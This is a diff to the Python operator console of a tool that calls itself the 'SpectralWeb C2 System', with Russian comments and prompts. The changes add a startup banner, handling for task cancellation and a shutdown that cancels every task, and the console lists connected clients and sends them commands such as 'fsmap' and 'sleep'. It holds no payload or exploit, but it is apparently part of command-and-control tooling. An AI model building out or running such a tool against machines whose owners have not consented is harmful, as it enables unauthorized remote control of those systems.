@@ -2,22 +2,43 @@ import asyncio
 from logs import Log as logger
 from prompt_toolkit import PromptSession
 from prompt_toolkit.patch_stdout import patch_stdout
+# Предполагаем, что Services корректно импортирован
 from backend.Services import close_client, close_all_client, list_clients, send_command
 
+
+# ----------------------------------------------------------------------
+# Функция для вывода финальной подсказки
+# ----------------------------------------------------------------------
+def print_c2_ready_message():
+    """Выводит рамку и текст подсказки один раз, используя логгер."""
+
+    prompt_text = (
+        "----------------------------------------------------\n"
+        "  SpectralWeb C2 System is running on http://127.0.0.1:8001\n"
+        "----------------------------------------------------\n"
+        "Введите ID клиента или команду:\n"
+        "  '0' — выход\n"
+        "  'sleep <id>' — отключить клиента\n"
+        "  'sleep_all' — отключить всех\n"
+        "  'list' — показать подключённых"
+    )
+    logger.info(prompt_text)
+
+
+# ----------------------------------------------------------------------
+# Основной интерфейс оператора
+# ----------------------------------------------------------------------
 async def operator_interface(server):
     session = PromptSession()
 
+    # УДАЛЕН ЛИШНИЙ КОД С session.prompt_async("")
+
     while True:
         with patch_stdout():
-            selected_str = await session.prompt_async(
-                """
-Введите ID клиента или команду:
-  '0' — выход
-  'sleep <id>' — отключить клиента
-  'sleep_all' — отключить всех
-  'list' — показать подключённых
-  >> """
-            )
+            try:
+                selected_str = await session.prompt_async(" >> ")
+            except asyncio.CancelledError:
+                break  # Выход из цикла при отмене задачи
 
         selected_str = selected_str.strip()
 
@@ -25,11 +46,22 @@ async def operator_interface(server):
         if selected_str == "0":
             logger.info("[*] Завершение работы. Закрываем соединения...")
             await close_all_client()
+
+            # 1. Отмена основного серверного сокета
             server.close()
             await server.wait_closed()
             logger.info("[*] Сервер завершил работу.")
-            break
 
+            # 2. ОТМЕНЯЕМ ВСЕ ОСТАЛЬНЫЕ ЗАДАЧИ В ЦИКЛЕ
+            # Это заставит asyncio.gather в Server.py выйти и выполнить cleanup.
+            main_loop = asyncio.get_event_loop()
+            for task in asyncio.all_tasks(main_loop):
+                if task is not asyncio.current_task():
+                    task.cancel()
+
+            return  # Выход из функции, чтобы позволить task.cancel() сработать
+
+        # ... (остальной код)
         elif selected_str == "list":
             clients = list_clients()
             if not clients:
@@ -57,7 +89,6 @@ async def operator_interface(server):
             logger.info(f"[*] Вход в режим клиента {cid}. Поддерживаемые команды: fsmap, sleep, back")
 
             while True:
-                # Проверяем, что клиент ещё подключён
                 if cid not in [c["id"] for c in list_clients()]:
                     logger.info(f"[!] Клиент {cid} отключился. Возвращаемся в глобальный режим.")
                     break
@@ -65,8 +96,6 @@ async def operator_interface(server):
                 with patch_stdout():
                     cmd = await session.prompt_async(f"[{cid}] client> ")
                 cmd = cmd.strip()
-                if not cmd:
-                    continue
 
                 if cmd == "back":
                     logger.info("[*] Возвращаемся в глобальный режим.")
